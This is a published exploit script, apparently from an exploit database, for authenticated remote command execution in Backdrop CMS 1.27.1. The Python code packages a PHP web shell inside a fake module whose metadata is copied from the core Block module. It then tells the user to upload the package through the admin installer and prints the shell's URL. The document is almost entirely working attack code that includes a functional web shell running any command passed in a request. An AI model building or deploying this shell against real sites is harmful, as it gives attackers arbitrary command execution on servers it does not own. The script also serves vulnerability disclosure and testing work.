# Exploit Title: Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)
# Date: 04/27/2024
# Exploit Author: Ahmet Ümit BAYRAM
# Vendor Homepage: https://backdropcms.org/
# Software Link: https://github.com/backdrop/backdrop/releases/download/1.27.1/backdrop.zip
# Version: latest
# Tested on: MacOS

import os
import time
import zipfile

def create_files():
    info_content = """
    type = module
    name = Block
    description = Controls the visual building blocks a page is constructed
    with. Blocks are boxes of content rendered into an area, or region, of a
    web page.
    package = Layouts
    tags[] = Blocks
    tags[] = Site Architecture
    version = BACKDROP_VERSION
    backdrop = 1.x

    configure = admin/structure/block

    ; Added by Backdrop CMS packaging script on 2024-03-07
    project = backdrop
    version = 1.27.1
    timestamp = 1709862662
    """
    shell_info_path = "shell/shell.info"
    os.makedirs(os.path.dirname(shell_info_path), exist_ok=True)  # Klasörüoluşturur
    with open(shell_info_path, "w") as file:
        file.write(info_content)

    shell_content = """
    <html>
    <body>
    <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
    <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
    <input type="SUBMIT" value="Execute">
    </form>
    <pre>
    <?php
    if(isset($_GET['cmd']))
    {
    system($_GET['cmd']);
    }
    ?>
    </pre>
    </body>
    </html>
    """
    shell_php_path = "shell/shell.php"
    with open(shell_php_path, "w") as file:
        file.write(shell_content)
    return shell_info_path, shell_php_path

def create_zip(info_path, php_path):
    zip_filename = "shell.zip"
    with zipfile.ZipFile(zip_filename, 'w') as zipf:
        zipf.write(info_path, arcname='shell/shell.info')
        zipf.write(php_path, arcname='shell/shell.php')
    return zip_filename

def main(url):
    print("Backdrop CMS 1.27.1 - Remote Command Execution Exploit")
    time.sleep(3)

    print("Evil module generating...")
    time.sleep(2)

    info_path, php_path = create_files()
    zip_filename = create_zip(info_path, php_path)

    print("Evil module generated!", zip_filename)
    time.sleep(2)

    print("Go to " + url + "/admin/modules/install and upload the " +
          zip_filename + " for Manual Installation.")
    time.sleep(2)

    print("Your shell address:", url + "/modules/shell/shell.php")

if __name__ == "__main__":
    import sys
    if len(sys.argv) < 2:
        print("Usage: python script.py [url]")
    else:
        main(sys.argv[1])